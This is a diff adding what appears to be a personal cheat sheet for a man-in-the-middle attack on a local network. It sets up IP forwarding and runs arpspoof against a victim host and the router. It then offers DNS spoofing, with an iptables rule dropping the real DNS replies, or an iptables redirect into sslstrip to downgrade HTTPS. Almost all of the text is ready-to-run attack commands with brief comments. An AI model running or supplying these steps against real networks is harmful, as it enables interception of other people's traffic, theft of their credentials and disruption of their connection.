@@ -1,0 +1,51 @@
+## Open wireshark and start sniffing
+
+
+## Forward packages not for you
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+
+## Verify
+cat /proc/sys/net/ipv4/ip_forward
+
+
+## Reconfigure the kernel parameters at runtime
+sysctl -p
+
+## See the victims arp table and notice the routers Mac Adresse
+arp -a
+
+
+## Start the arp poisoning of the client (the first IP is allways the victim)
+arpspoof -i eth0 -t 192.168.242.22 192.168.242.2
+
+
+##Start the arp poisoning of the router (the first IP is allways the victim)
+arpspoof -i eth0 -t 192.168.242.2 192.168.242.22
+
+
+## Take a look in wireshark and see all the arp packages
+
+
+##DNS Spoof or HTTPS Strip?
+
+###################################################################################### 
+##Start the DNS spoof
+dnsspoof -f /root/Desktop/hosts
+
+## You might have to drop the request from the real DNS server
+## (This destroys the internet for the victim)
+
+iptables -A FORWARD -p udp --source-port 53 -d 192.168.242.20 -j DROP
+
+
+######################################################################################
+##Set up firewall to redirect traffic to 
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8880
+
+
+##Start the SSL Strip on port 
+sslstrip -p -s -l 8880
+
+
+
